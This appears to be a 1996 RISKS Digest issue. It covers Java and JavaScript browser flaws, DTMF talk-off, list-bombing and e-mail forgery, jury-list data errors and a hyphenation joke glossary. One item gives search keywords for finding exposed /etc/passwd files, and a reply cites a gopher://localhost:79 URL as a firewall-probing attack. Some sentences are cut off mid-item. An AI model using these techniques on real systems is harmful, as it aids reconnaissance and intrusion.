<P>
We have discovered another serious security flaw in the Java programming
language, which allows a malicious Java applet running under Netscape
Navigator (version 2.0 or 2.01) to execute arbitrary machine code.  We have
implemented an applet that exploits the flaw to remove a file.  Until a fix
is issued, Netscape users can protect themselves by disabling Java in the
Security Preferences dialog.
<P>
At present we are not releasing technical details about the flaw.  We will
announce the full details later; some of the details will also appear in our
upcoming paper in the proceedings of the IEEE Symposium on Security and
Privacy, to be published in May.  Our paper also contains an overall
analysis of Java's security.  For an advance copy of the paper, send mail to
<A HREF="mailto:felten@cs.princeton.edu">felten@cs.princeton.edu</A>.  The paper will be available in about a week.
<P>
[Note that the "security enhancements" announced by Netscape in version 2.01
of Netscape Navigator do not fix this flaw.  They fix two separate flaws found
last month, one found by us (<A HREF="/Risks/17.77.html">RISKS-17.77</A>) and independently by Steve Gibbons,
and the other found by David Hopwood (<A HREF="/Risks/17.83.html">RISKS-17.83</A>).]

In <A HREF="/Risks/17.92.html">RISKS-17.92</A> Tony Panero (Hare Krsna chants ...) suggests that it is
difficult to avoid false detection of DTMF signals in human speech, but that
it was reasonable to do in-band signaling when tone dialing was originally
designed because dialing is not a context that typically includes speech.

to be the original design document for what is now DTMF [1].  Guarding
against false detection of signalling tones in human speech and enabling use
of the signalling tones for end-to-end applications were the primary design
objectives. Here are a few passages from the introduction:
<P>
In recent years, customer signaling from a telephone set by
means of pushbuttons has appeared increasingly promising. An
early plan has been reported in which the operation of a
pushbutton produces four effects: (a) the generation of a
damped oscillatory wave at one of ten digit-identifying
frequencies with the voice range; (b) the generation of a
similar damped wave at one of eight party-identifying
frequencies, also in the voice range; (c) a stepwise reduction
of direct current drawn by the set and (d) the temporary
disablement of the speech transmitter.  Actions (c) and (d)
provide protection against talk-off, i.e., false signaling
due to speech or noise at the transmitter.
<P>
This plan contemplated only the transmission of information to
the central office, but in the long run it would be
advantageous to be able to signal "end-to-end," over any
established connection that will transmit speech.   With this
added objective several new considerations are introduced.
Clearly the signals should not contain an out-of-band
component such as the dc step.  [...]
<P>
Voice-frequency signaling is, of course, already an
established practice in the Bell System.  One example is
multifrequency key pulsing (MFKP), which is widely used for
toll signaling.  However, minimization of talk-off was not a
factor in its development [...]
<P>
This paper describes an all-voice-frequency signaling system
that provides substantial protection against talk-off.  [...]
<P>
After the introduction the article proceeds through a discussion of the
design and describes the preferred way to build a detector (from filters,
hard limiters, and power detectors) to make it robust against talk-off.  The
essential part of the design is that to detect the presence of one of the
component tones, you filter out the signals in the other band while
carefully preserving as much energy as possible in other parts of the
spectrum.  You then pass this signal into a hard limiter whose output is
connected to a narrow selective filter for the tone of interest.  You then
detect the power in the signal coming out of the narrow filter.  Quoting
again:
<P>
The selective circuitry that follows the limiter is designed
to recognize a signal as bona fide only when it not only falls
within a rather narrow passband, but also appears at an
amplitude within about 2.5 db of the full output that the
limiter is capable of delivering.    Thus when a burst of
speech contains components at more than just the two signal
frequencies, this fact is used to inhibit recognition of the
signal frequencies in the burst. [...]
<P>
Further discussion includes the selection of signaling frequencies, tone
power levels, and filter parameters to further reduce the likelihood of
false detection due to music or harmonic distortion of vowels in human
speech.  Each of these scenarios may lead to situations where a substantial
fraction of the energy in the signal is at the signalling frequencies.  By
providing just enough but not too much band-stop filtering, the detector can
be made less likely to false by not accepting tones when the relative power
levels aren't right, but still be able to cope with the amount of twist
typically found in the end-to-end frequency response of phone lines.
<P>
I do not doubt that many systems using DTMF signaling today are susceptible
to falsing.  I fear that the careful design that went into the DTMF system
specifically to enable the construction of DTMF detectors with good talk-off
resistance may have been forgotten.  IMHO this 1960 BSTJ article is a
must-read for anyone designing a DTMF detector, which over 30 years later is
likely to be a programmer writing (or cutting-and-pasting) DSP code.

<P>
I run a large mailing list, and every few weeks for the last several months
someone has complained that they were getting messages from me without
knowing why.  This was not just a matter of people getting forwarded
messages with misleading headers, since most of these people were in fact on
the mailing list.  Finally this week I sent a query on the subject to the
whole list.  Here is a summary of what I learned.
<P>
The Internet has indeed been suffering an epidemic of bogus mailing list
subscriptions, particularly over the last few weeks.  I have had reports
from numerous list maintainers of dozens of mysterious subscriptions suddenly
showing up on their lists, followed by confusion or acrimony.
<P>
Some instances are clearly malicious.  Numerous people have been involuntarily
subscribed to many mailing lists.  Celebrities who have been "list-bombed"
in this fashion include Rush Limbaugh (who reportedly discussed it on the
air) and Philip Elmer-Dewitt (who wrote about it for Time Magazine).  The
White House has been list-bombed too (and sent out a message to the effect
that list-bombing just hurts the interns who have to filter the stuff, not
the officials who presumably are the targets).  Two main motives have been
mentioned: political disagreement, often but not always with regard to
Internet issues like censorship (apparently this technique is being practiced
by dunderheads on both the left and the right); and spam (many spammers have
apparently gotten the list-bombing treatment).
<P>
List-bombing, however, does not seem to be the only phenomenon here.  Only
a few of the people who complained to me mentioned other mailing lists, and
I think that victims of list-bombing are much more likely to change to a new
account than to try unwinding all of their bogus subscriptions.  On my list I
speculated that a demon might be generating subscriptions on a random basis,
but nobody has reported any actual evidence for this.  At the same time, it
seems to be happening on too large a scale to have been done entirely by hand.
<P>
One particularly depressing point, mentioned by a few people, is that some
Web browsers make it very easy to forge mail by simply typing in the victim's
e-mail address when the browser starts up.  For example, the Web browsers on
the Macs in the undergraduate lab where I teach always start up by asking for
a name and e-mail address, and it doesn't take a rocket scientist to think
to type in someone else's information.
<P>
Several people explained ways, other than using Web browsers, to forge e-mail
headers.  I won't describe them; they are not very interesting.  I would like
to see pressure on authors of software that sends mail to remove features
that make it easy to forge headers.  We probably can't make it impossible,
but at least we can get rid of the amateurs.  I won't recount the even more
destructive (albeit more creative) possible uses of forged headers that some
people suggested.
<P>
That said, the real underlying problem is more basic: personal computers,
unlike mainframes, usually don't authenticate their users.  It is not at all
clear what to do about this.  As far as I can tell, the mail header standards
presuppose that there exists some determinate truth about what mail address
a message is "from", but this isn't the case (for example) on the publicly
available Apple Macintosh in the UCSD library on which I am now typing, which
can send e-mail but cannot receive it.  Another problem is that forgery of
mail headers has constructive uses, for example when mailing list maintainers
set the "From:" field to point at some alias other than their own personal
account in order to avoid getting swamped with e-mail related to the list.
<P>
Listserv has an option whereby the putative subscriber must reconfirm a
subscription by replying to an automatically generated message.  I believe
this feature originated to solve the more pervasive problem of e-mail messages
(subscription requests, for example) that are badly formed, or that come from
badly configured machines, or that otherwise cannot be replied to.  But it's
also a way to screen out forgeries, and as far as I can tell, all maintainers
of open mailing lists are going to have to shift to such a protocol soon.
<P>
The involuntary list subscriptions do not all result from hostile actions.
Some people attested cases in which a university or online service had
recycled an old user's name, giving it to someone else, so that the new user
got all of the old user's mailing list subscriptions.  One person speculated
that some of the mystery subscriptions may have come from friends subscribing
friends to the list without telling them.  Who knows.
<P>
It might be possible to track down the perpetrators by logging subscription
requests; if we were to save the complete header for each such request then
we might notice discrepancies and identify where the bogus messages were
from.  My own list, though, has about 3600 subscribers and a lot of turnover,
so the log file would grow quickly if it kept the complete headers.  Some of
the X.400 headers from Europe are pretty darn long.
<P>
It's worth pointing out, in case any list-bombers are reading this, that
even if your intended victim deserves it, list-bombing has nonetheless
been causing a lot of pain to innocent parties.  The most obvious are the
list-owners who have to deal with complaints, remove addresses, etc.  But the
other subscribers of the list must often wade through messages to the whole
list from victims, followed by other messages in reply that are probably not
relevant to the list's intended topic.
<P>
Finally, just in case any of the mystery subscriptions to my own list were
intended as revenge against me rather than against the involuntary subscriber,
at least a third of the involuntary subscribers say that they actually like
the list, and some of them have decided to stay.  My advice would be to grow
up and learn how to engage in real politics instead of this childish sabotage.

1)  Java and JavaScript Vulnerabilities, By John Fisher<BR>
=========================================================================
<P>
Introduction
<P>
Over the past several weeks, a variety of reports have surface regarding
security problems with Java and JavaScript. Java was developed by Sun
Microsystems Incorporated, and JavaScript was developed by Netscape
Incorporated. Java is available directly from Sun through the Java
Development Kit. Both Java and JavaScript are supported with Netscape
Navigator 2.0. Although similar in name, and in some ways similar in syntax,
these two languages are vastly different in their usage.  Accordingly, the
security problems that have been reported are completely separate as well.
This article maps out what problems have been reported and discusses the
availability of solutions.
<P>
Java applications communicate easily across a network environment,
particularly the Internet. Although not initially intended for this
environment, Java became a natural mechanism for enhancing the usability and
functionality of the World-Wide Web. With Java "applets," a Web site can
provide functionality for its visitors that is not available with HTML code.
<P>
Java can be used in a variety of different capacities. A standard Java
application can work stand-alone, providing functionality similar to other
programming languages (i.e., file input/output, graphical interfaces, etc).
When a Java application is made available on a Web site (via an HTML Web
page), it is in the form of a Java applet. An applet is given definite
restrictions on its capabilities. For example, a Java applet can not write
files to a Web visitor's local disk drive, or contact an Internet site
besides the server it was downloaded from. Java was supported with
Netscape's Navigator 2.0, released in February.
<P>
JavaScript is also supported in Navigator 2.0. Originally named LiveScript,
JavaScript code is placed directly in the text of an HTML document (as
opposed to being referenced in the HTML, similar to how an image would be
included, like Java does). For browsers that don't understand JavaScript,
JavaScript code simply seems to be a comment in the HTML code. For Navigator
2.0, a JavaScript program can provide additional functionality for the Web<BR>
page that can't be provided with just HTML. While JavaScript provides
increased functionality, it is syntactically simpler and less powerful than
Java.
<P>
Both Java and JavaScript have been developed with security in mind. Both
were developed with considerable emphasis on preventing a Web site from
gaining unintended access to a Web user's system or from performing actions
on behalf of the Web user without the user's knowledge.
<P>
Unfortunately, as is common with new technologies, unanticipated security
concerns have come to light. The next section addresses the latest security
concerns for Java and the section following addresses security issues for
JavaScript.
<P>
Java Problems
<P>
The security problems reported about Java exist both in Netscape's Navigator
2.0 and in the Java Development Kit 1.0 from Sun Microsystems. Solutions to<BR>
both problems are provided below.
<P>
DNS Attack
<P>
In January, three students at Princeton University (Drew Dean, Ed Felten,
and Dan Wallach) discovered a way to use Java to exploit a well-known Domain
Name Service (DNS) vulnerability.
<P>
Note that this is not a vulnerability with Java, per se. It is really a
vulnerability with DNS that Java does not check for.
<P>
DNS servers provide a means for translating between host names and IP
addresses. For example, if a computer on the Internet were to initiate a
connection to the machine ciac.llnl.gov, the local DNS server for that
machine with resolve the host name as representing the IP address
128.115.19.53.
<P>
Java applets running under Sun's appletviewer or Netscape's Navigator 2.0
are only allowed to connect the host from which they originated. To allow an
applet to connect to other hosts would be dangerous, as the applet would be
acting on behalf of the user who downloaded the applet. Imagine downloading
an applet from a Web site, only to find that the applet sent mail to another
system, acting as you. What's worse, without this restriction, a Java applet
would have all the access capabilities your machine does, including
accessing hosts behind a firewall.
<P>
The problem occurs because Java does not completely verify that the
information provided by the DNS server is accurate. Thus, if one can corrupt
the DNS server, it is possible to trick a Java applet into accessing an
arbitrary host. The potential for corrupting the information in DNS servers
is a known problem. See, for example, CIAC Bulletin G-14, Domain Name
Services Vulnerabilities.
<P>
CLASSPATH Attack
<P>
In February, David Hopwood of Oxford University made public another
security problem with Java related to the loading of local class
libraries.
<P>
Java provides a class loading capability which allows a Java applet to load
a class either from the host it originated from or from the user's local
system. Java applets residing on the user's local system are allowed special
capabilities such as reading and writing files or executing processes.
Either of these tasks can cause serious security problems if not used
properly. But, for large Java applets connecting to recognized hosts, the
additional functionality provided by placing class libraries on a local
system may be warranted.
<P>
Ordinarily, an applet is restricted to loading applets from the directories
specified in the environment variable CLASSPATH. However, Hopwood discovered
a way to load class libraries from any readable directory on a user's
system. This means that by placing a malicious class file and a dynamic
library on the user's system, an attacker can open that system to attack.
<P>
JavaScript Problems
<P>
Several different security problems have been identified with JavaScript as
well. Some of these vulnerabilities existed only in the public beta
distributions made available by Netscape Navigator 2.0. Others still were
present in the final release. The various problems reported include the
following:
<P>
(1) Reading a user's URL history list and transmitting it to a remote site.<BR>
(2) Reading a user's disk cache (containing URLs recently acquired by<BR>
the Web browser) and sending the information to the Web server.<BR>
(3) Stealing the e-mail address of the Web user and forging an e-mail<BR>
message with it.<BR>
(4) Obtaining a recursive listing of local disk directories.<BR>
(5) Logging all URL accesses made by a Web browser and transmitting<BR>
the information to a remote system.
<P>
Problems (1) and (2) were fixed in the final release of Netscape Navigator
2.0. The other problems were fixed in the latest release, described below.
<P>
Solutions
<P>
Netscape solution
<P>
In late February, Netscape made a patch available to solve the DNS server
problem.
<P>
On March 14, Netscape released Navigator 2.01, which fixed all of the
vulnerabilities described above. It can be found at:

<P>
Sun Microsystems solution
<P>
On March 15, Sun released Java Development Kit 1.0.1, which fixed all
of the vulnerabilities described above. It can be found at:

<P>
=========================================================================<BR>
3) Security and Web Search Engines, By John Fisher<BR>
=========================================================================
<P>
A variety of very powerful search engines are available on the
Internet, including Netscape
(<A HREF="http://home.netscape.com/home/internet-search.html">http://home.netscape.com/home/internet-search.html</A>), Yahoo<BR>
(<A HREF="http://www.yahoo.com">http://www.yahoo.com</A>), Alta Vista (<A HREF="http://altavista.digital.com">http://altavista.digital.com</A>),<BR>
Lycos (<A HREF="http://www.lycos.com">http://www.lycos.com</A>), and others. These engines, known as "web
crawlers," provide a means for users to find URLs matching
keywords. Their databases are populated by gathering up all of the
available information provided by any Web server that can be
found. The Alta Vista database, for example, contains an index over 30
gigabytes in size.
<P>
But, perhaps, these search engines have become a little too powerful. Some
Web sites have provided a few too many links, including information related
to system configuration. For example, doing a search for keywords such as
"root", "daemon:", "passwd", etc, will return back a few stray /etc/passwd<BR>
or /etc/group files, located on systems that have very poor Web
configurations. This is a way to quickly find those Web sites that are not
maintained very well and are most vulnerable to attack.
<P>
So, the lesson here, if you maintain a Web site, be very sure of what
information you are making available. Make sure no URLs are available which
give configuration information about your system. With today's advanced
search engines, you may be opening yourself to unnecessary problems.
<P>

<P>
The example of answering machines that can be easily "talked-off" by speech
is but one case of a broader category -- which I'll call "technology
deterioration".  It's not that the proper techniques for avoiding DTMF
(Touch-Tone) talk-off haven't been designed (when's the last time you
talked-off a dialtone on a central-office switch?), but rather that many
inexpensive devices don't bother implementing all of the specs for proper
performance.  Many answering machines also provide a wide selection of other
implementation deficiencies as well, including the frequent use of two-digit
security codes, and often a total lack of incorrect entry lockouts, making
"exhaustive" search trivial.
<P>
The same sorts of problems can be found in a wide spectrum of devices, from
computer keyboards to automobiles.  In many (perhaps most) cases, the root
cause is simply the desire to cut production costs.  But there is evidence
that in a significant number of cases the designers simply didn't know
better.  To the extent that the NIH ("Not Invented Here") philosophy
prevails around the world, this is an easily observed phenomenon.
<P>
What's of particular concern is how the results of these attitudes can
impact devices and systems with significant RISKs associated with their use.

Misquoting or misattribution is not unusual in newspapers.  The widespread

Those who are not versed in the technology or who are not diligently Web

<P>
My organization has to print and mail several thousand postcards every
working day, so we want to get the best postage rates we can. This means not
only sorting by zip code, but adding a full ZIP+4 whenever possible, and
printing postal barcodes (Delivery Point Bar Code, or DPBC, as the post
office calls it) on the cards. The program that generates the postcards is
custom written by an outside group, but we use standard software (Postware
Presort) to do zip code presorting and get the ZIP+4 information on the
cards, and a standard printer (Mannesman Tally MT691) to print the cards
(including the barcodes).
<P>
We've been doing this for quite a while, without major problems, until one
day a few weeks ago when the Post Office rejected our outgoing postcards
because "the barcode had too many bars". This caused us a great deal of
concern. (Several thousand postcards a day, with us paying about $.02 extra
postage per card, can really add up.) So, for the past few weeks, our
outside group has been working with us to try and figure out what the
problem was. Yesterday, everything clicked.
<P>
The standard for DPBC is one start bar, then five bars per digit, and one
stop bar. The digits in a DPBC are: the ZIP+4 (9 digits), two digits from
the street address, and a "correction digit" (for a total of 62 bars). We
had configured our zip code package to automatically figure out the
"correction digit", and were inserting the correction digit on the<BR>
postcards after the street address and zip code data.
<P>
The MT691 printer has POSTNET barcoding (for DPBC) built-in. All you have to
do is send it a control code to turn on POSTNET barcoding, send it the data
you want barcoded, and a control code to turn off POSTNET barcoding, and it
will print nice POSTNET barcodes on your forms. Which is what we were doing.
<P>
It turns out that the MT691 has a nice feature: in POSTNET barcode mode, it
*automatically* calculates the correction digit for you. So we were sending
it data that included an already calculated correction digit, and the
printer was calculating a correction digit based on the data it was being
sent...and adding an extra spurious correction digit.
<P>
It also turns out that this behavior is documented *nowhere* in the manual.
<P>
The moral? As Tom Clancy said, "You can't even trust the manual." (Or, for
that matter, the Post Office, which took a year and half to notice this
problem.)

The radio in my car displays either time of day or the tuned frequency.
After changing channels, it automatically shows the frequency for 10
seconds, then reverts to time.  There is also a button to manually toggle
display modes.  Yesterday I happened to press the button to view time
precisely 10 seconds after changing channels.  My action canceled the
automatic action thus causing a result opposite to my intention.
Unfortunate timing deprived me of visual feedback of what happened.  Most
people would blame the radio for misbehaving.
<P>
I tried to think of a way to redesign the toggle and automatic functions to
be infallible. I couldn't.  This made me despair.  If we can't make such a
mundane device behave perfectly, what can we achieve?
<P>
Soon thereafter, I read Mr. Cross' article in CPD 17.91.  He discussed
inadvertent activation of a machine and continued to say:<BR>
&gt;It is possible to say that we have advanced to such a point in so<BR>
&gt;many areas that seemingly innocuous things in one (such as a track of<BR>
&gt;music on a CD) can trigger *very* unexpected results in another.
<P>
This made me wonder where the *real* complexity limit lies. The boundary
between reliable expected behavior and the risk of unexpected behavior. I
concluded that it lies somewhere between a simple inanimate object like a
knife, and a folding knife.  A simple knife doesn't *do* anything, we do
things to it.  It has no behavior.  A folding knife will, some day, fold
unexpectedly and someone will blame the knife.  This leads to the seemingly
obvious result:
<P>
Any object, capable of any behavior, is capable of unexpected behavior.
<P>
Disregard of this simple principle is the root cause of all other risks.
It could be an alternative way to define the *meaning* of the word risk.

&gt;Java/Netscape security flaw (Ed Felten):
<P>
Indeed there is a more basic flaw in the URLs used in the Internet that
appears to make firewalls very weak prey for attackers and enables Web
sites to launch highly distributed and hard-to-trace attacks.  The basic
flaw was published some weeks ago (e.g., <A HREF="gopher://localhost:79/0">gopher://localhost:79/0</A> for
example) and extensions have now been used to launch probes and attacks
by the thousands from sites all over the net.  For more details, see:

<P>
&gt; More on list-bombing (Phil Agre):
<P>
A discussion of list spams has been started on the <A HREF="mailto:LACC@suburbia.net">LACC@suburbia.net</A>
mailing list.  The ideas presented to date include:
<UL>
<LI>E-mail spams can be eliminated by refusing large-volume e-mail
from unknown senders.  Whenever e-mail arrives from a new sender,
the user is told about it, and further e-mail from the same
sender is refused until and unless the recipient signals the
system to allow ongoing e-mail from that source. (At least one
such mailer exists today.)
<P>
<LI>E-mail receivers can be rigged to refuse e-mail from known lists
unless specifically configured to allow it by the user (or in
the alternative, configured to allow mail unless specified to
not be received from a list of sites/users).  The problem with
this is maintaining a good list of lists. (I know of one mailer
that does this as well.)
<P>
<LI>Automated e-mail spams can also be prevented by sending back a
"user ID" to the sender of e-mail which must be used in subsequent
communications.  (This is unlikely to be effective.)
<P>
<LI>Mailing lists could eliminate their use in signup spams rather
easily.  Instead of the single signon protocol they use now,
they could send a confirmation e-mail containing a unique
identifying string to the proposed list member.  The new member
would have to reply before being added to this list.  This would
be a simple and effective method of limiting e-mail spams to one
notification per list. (This would work, but would require fixes
for the common mailing list handlers.)
<P>
<LI>For the techies among us, there is always the extensive use of
digital signatures.  If every e-mail were signed, we could
authenticate sources before allowing them to post to lists, and
trace them back to their sources. (Unlikely to happen soon.)
</UL>
Then there is the moderated list.  Notice that the RISKS list
has never been spammed. (Although perhaps a few users have been
spammed by getting signed up, I doubt if they have been
negatively impacted.)
<BLOCKQUOTE><I>
[Fred, the USENET readers of comp.risks were spammed recently,
along with many other USENET groups, but our direct-mail

</I></BLOCKQUOTE>
All lists should include details on how to sign off the list in
each mailing.
<P>
Finally, an optional X-Mailing-List header for mail to allow lists
to be easily differentiated and identified.  (Again requires
participation by all list owners but could work.)

A couple of years ago I posted some information on forged e-mail and the
fact that the header almost always contains sufficient information to
determine if the message is bogus. For instance examination of the
"Received: from" lines in the header is generally sufficient to raise
doubts.
<P>
The problem is that e-mail is essentially sent "blind" and unlike
interactive sessions encourages "fire and forget". Further RFC821 makes it
clear that the information sent by the mailer such as the "Reply" entry was
intentionally made user configurable ("isn't a bug, it's a feature").
<P>
In normal messaging this is not a problem however I have seen several
newsgroups which routinely generate over a hundred messages a day.
<P>
To me, the simplest possible mechanism would be to require confirmation
with a unique message. I suspect that few will be willing to go to this
length so have a fallback: if the subscribing message was "Received: from"
a domain other than that of the apparent requestor, then require confirmation.

Perhaps the simple solutions of a simpler world just aren't applicable in
the new, now-massively-popular internet.  Many protocols on the net -- from
e-mail to usenet to more basic routing issues, all familiar to RISKS -- are
based in trust.  When the net was small, trust worked; now, I have my
doubts.
<P>
A couple years ago I proposed a new system to the team at CERN that created
the WWW.  I won't bore everyone with the details, but basically 1)
discussion forums existed on an invisibly sliding scale between a
single-host web-annotations to a network-wide usenet group; and 2) user
access varied on a scale between completely-user-initiated "browsing"
through user-merely-notified "newsreading" to sent-to-the-user "mailing
lists."
<P>
However, the user interaction was with the local newshost, which then if
necessary dealt with remote servers.  All articles, digests, summaries, etc.
that are mailed to a user are sent by that users' local newshost -- which
incidentally gives the user one central control point.  (It also completely
automates mirroring and caching, which was my original aim.)
<P>
This certainly won't stop anyone from sending bogus mail.  But it would be
more difficult to illicitly subscribe someone to a mailing list, and it
would be much easier for the user to clean up the problem.

<P>
Fidonet suffered *massive* list-bombing attacks on dislike administrators a
couple of months back. What made this worse than the usually list-bombing is
that once the mail entered the Fidonet,org domain, it was transported via
dial-up Fidonet connections, not via the Internet.
<P>
This resulted in effective denial of service attacks, as as some of the
systems couldn't handle the traffic levels, and even where they could,
trying to find legitimate mail was difficult when it was mixed into the list
traffic.
<P>
This was aggravated due to a couple of design "features" of Fidonet.  Most
Fidonet nets (the .nxxx level in the addresses) don't have a local
fidonet&lt;&gt;Internet gateway system.  So traffic for
<A HREF="mailto:user@f111.n222.z1.fidonet.org">user@f111.n222.z1.fidonet.org</A> all went to the default gateway. That system
then stuck it into the low-priority routed mail system rather than wasting
his money dialing direct all over North America. The routing system is
hierarchical, so lots of nodes got *really* jammed by this. Even nets with
local gateways still had that poor gateway system trying to make phone calls
to the recipients.
<P>
This sort of thing wasn't anticipated, except that policy was that the
gateways were *not* to be used for mailing lists. The end result was that on
March 1st, the default gateway was discontinued. Now, only fidonet nets with
explicit MX records are reachable.
<P>
Gateway operators are *still* getting huge amounts of list traffic,
much of it aimed at addresses that have *never* existed. This has
apparently been an organized attack by some party, and it is at least
successful to the extent that it annoys the gate-ops.
<P>
My advice to list maintainers is to lock out *all* addresses in the
fidonet.org domain, and if you get complaints, check to see which system the
MX record points at and ask the postmaster there if he allows list traffic
through his system. Nine times out of ten the answer will be along the lines
of "Hell, no!". And you can then report to the complainer that he is
violating the rules under which the gateway operates.
<P>
If you get a yes response from a gate-op, great. Just remember to check
occasionally to see that the gateway system hasn't changed.
<P>
It's a pity that things are like this, but too many people are abusing what
was meant to be a conduit for low-volume *personal* mail. &lt;sigh&gt;

<P>
It's just as easy to forge e-mail from a mainframe as from a personal
computer (*). The basic problem is not simply on the client side; it's on
both sides. The mail client and mail server must implement a system that
confirms and records the identity (insofar as it can be determined) of the
mail sender, and _rejects e-mail for which the identity cannot be
confirmed_. Further, the system would have to have wide implementation, or
the malicious e-mail sender could just find a non-authenticating server to
his or her e-mail.
<P>
As usual, the price of security is convenience; such a system would be
substantially more complex than the common SMTP protocol we have now, and
would require software changes on both the client and server sides. For
safety in a lab or office environment, it might also require that users
enter a confirmation password each and every time they send e-mail, although
Kerberos-style authentication tickets can be used to get around that problem
to a limited extent.
<P>
(*) Admittedly, using a password-authenticated system for the forgery
provides a better record of what transpired, leaving the miscreant open to
capture. But what if the miscreant were to send e-mail via an open SMTP
server in, say, Singapore? I would imagine that getting a sysadmin in a

To assist in those who need to cancel spams, we have set up a free

<P>
We considered handing out a convenient shell script along with the list of
over 10,000 mailing lists we are now able to cancel subscriptions to, but we
decided this might add to spams instead of eliminating them.
<P>
Instead, we opted to have the user provide the site name and we provide a
shell script to unsubscribe from the lists coming from that site.

Another pool used in Oregon is the list of registered car owners.  This,
combined with a zip code that overlaps two counties, got me a Jury Duty
summons for Multnomah county while I live in Washington county.  Of course,
the Department of Motor Vehicles representative had trouble fixing our
record because the computer "knew" that our zip code was a Mult. Co.
zip.  As it turns out, probably everyone in our zip code in Wash Co. has
this problem but doesn't know it yet.  And no, the DMV would not change us
all - they told us that each person has to call in individually.  They
didn't want to hear from a Wash. Co. official requesting a blanket change.

In most (all?) states, whatever agency issues drivers' licenses also issues
official ID cards for people who aren't eligible to drive or don't wish to.
For people who don't wish to drive, or for children who look several years
older/younger than they are, these cards are a necessity for things such as
writing checks, watching movies with their peers, etc.
<P>
If Emily had a state-issued ID card, it doesn't take much imagination to
figure out why she got called.  One might try to fault a computer.  But the
real risks are nothing new:

<LI>politicians (or others) not thinking through what they do

Jury summoning and selection procedures are set by New Jersey state law.
New Jersey has recently greatly expanded the lists from which jury duty
lists may be composed.  Three were concerns about non-representative juries
in some urban counties, and claims that the expanded lists would add 30%
more bodies to the jury pool.  The new state law also ended the exemption
for police officers and other professions.  (Like a cop wouldn't be
challenged right off a jury -- what a waste of time!)
<P>
The youthful juror problem is occurring because just about any official
contact with the state government now gets you onto the jury list.  Little
Emily's case is only one of several, but hers came to public attention
because her parents are lawyers and pointed out the idiocy publicly.  It
seems Emily had to file a state income tax return, probably for interest
income, and got onto the massive jury list that way.
<P>
[Above info as I remember it being reported in the Star-Ledger last Sunday
-- any errors are mine.]
<P>
One wonders how well the new expanded jury lists have been winnowed.  I can
see an active citizen, who drives, owns property, files taxes, has wages
reported, votes, etc., being present on the list many times.  It seems to me
that this would lead to a non-representative jury pool, biased toward people
with multiple jobs and owning property.
<P>
While a NJ juror is now exempt for three years after actually serving,
certain counties in NJ are notorious for summoning large pools, then
excusing most of them because the court-load is not what was expected.  I
for one am sick of turning my planned work schedule upside-down, then
calling the juror tape on the morning of my first day and finding I'm
excused, then 9-12 months later, going through the whole process again
because I haven't actually _served_.  I had the honor of receiving two jury
summonses in the same month, so I am already unimpressed with Middlesex
county's juror data handling skills, and that was _before_ the new law, when
only voter and driver registrations were used.  The juror questionnaire asks
for SSN, but utterly lacks a privacy act statement, showing just how "up" on
data issues this county is.
<P>
I'm betting that Emily's parents will be making more "Please excuse my child
from jury duty" calls to the courthouse before she's 18.  After all, every
year she'll file a tax return, and get back onto the jury summons list.
<P>
Aside from pointing out the problems of using data collected for one purpose
for an unrelated purpose, the new juror selection lists and criteria risk
further annoying citizens of this state.

Considering the date, and considering that no genuine April Fools' piece has
appeared yet, it seems appropriate to be quite serious about a seemingly
frivolous subject that comes up repeatedly in RISKS, in one guise or
another.  I offer the following item, which may be reproduced freely,
subject to the stated RISKS guidelines at the end of this issue.  May Your
April Fools' Day March Along Augustly.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++ The Hyphenater's Handbook (but *not* The Hyphen-Haters Handbook) ++
++ Chapter excerpt, "e is for electronic" -- Peter G. Neumann, 1996 ++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Up until last year, I have used the term "E-mail" in RISKS to denote
"electronic mail".  I would like to be able to let the letter of an acronym
reflect the upper- or lower-case appearance of the word or term it denotes
(as in "DoD"), and to separate acronyms and text with a hyphen in hybrid
representations (as in "e-mail").  However, lower-case acronyms that mimic
natural linguistic expressions (such as "ram" and "pin") thereby become
confusing, while upper-case acronyms beg for lower-case plurals to
distinguish them from the final S as an acronym (as in HTTPs versus HTTPS).
We also must live with multiple meanings (as in MAC, not to mention Mac,
Macs, MACs, and MACS).  Thus, there seems to be no easy algorithm that is
also sensible.  So great care is required in choosing risk-free acronyms.

This note is a discourse on why the hyphen is desirable for disambiguation,
although it is clearly anathema to hyphen-haters.  Two representations are
given -- one without hyphens ("NO-"), and one with hyphens ("YES-").  Some
suggestive interpretations of the latter are included [with occasional
retrointerpretations of the former in square brackets].  (I think I might
simply have to go back to "E-mail" from now on!)

NO-        YES-        Interpretation
---------  ----------  --------------
eat        e-at        The "@" symbol [which causes many programs to choke]
educe      e-duce      The tyrannical leader of a moderated e-mail newsgroup
egad       e-gad       1. An electronic crowbar used to disrupt systems;
2. To surf the net nonspecifically (to e-gad about);
3. A mild e-mail oath.
egest      e-gest      An electronic adventure or exploit [well discharged]
ego        e-go        To initiate or restart a program

elan       e-lan       An electronic local-area network
[*elan* suggests *dash*, not *hyphen*!]
elan vital e-lan vital After Bergson, the vital force immanent in, or at
least desirable in, local-area networks.
elapse     e-lapse     An omission in an electronic communication
elate      e-late      Relating to delayed electronic operations
elater     e-later     Lazy evaluation, as in a c-u-e-later allocator

election   e-lection   An altered electronic version of text
[particularly for voting data]
elicit     e-licit     Legal, as in a valid argument or nonrepudiatable message
elite      e-lite      Optimized version -- e.g., a starkly compressed
e-mail message, or a minimum-toehold process
elocution  e-locution  Peculiar expression that results from use of
spelling and grammar checkers
email      e-mail      Electronic mail [Distinguishing itself from every
other term on this list, the unhyphenated version
has no natural meaning whatever, but spelling
checkers might suggest Emile or Ismail.]
emend      e-mend      To make a hex or binary patch
emerge     e-merge     To combine different input streams
emigrate   e-migrate   To move electrons externally
emission   e-mission   Sometimes known as a C4I task
emu        e-mu        Electronic microunit [found mainly in crossword puzzles]
enfold     e-n-fold    Replicated *n* times electronically [SEE FOOTNOTE below]
enucleate  e-nucleate  To cluster disparate data [or to remove the kernel!]
enumerate  e-numerate  Someone who is literate about computer representations
epact      e-pact      An agreement on programs for leap-year adjustments
[Note: the epact is the excess of the solar year
over the lunar year.]
equality   e-quality   A property of a computer system or network
equip      e-quip      Humor embedded in e-mail
erector    e-rector    The head of a remote-access university
escarp     e-scarp     The protected side of a firewall
[This is a case in which the e is gratuitous,
as in estop, enow, and the next example.]
especial   e-special   An anomalous event of some particular interest
estray     e-stray     Random electromagnetic interference
estrange   e-strange   An anomalous output or internal state

every      e-very      A technocomparative term
evocation  e-vocation  Job of someone who works with computers
evolute    e-volute    A system with a resilient spiral shell structure
eyes       e-yes       ACK! or positive acknowledgment [the eyes have it]

VIRTUAL REALITY TERMS:
eastern    e-astern    The virtual view to the rear
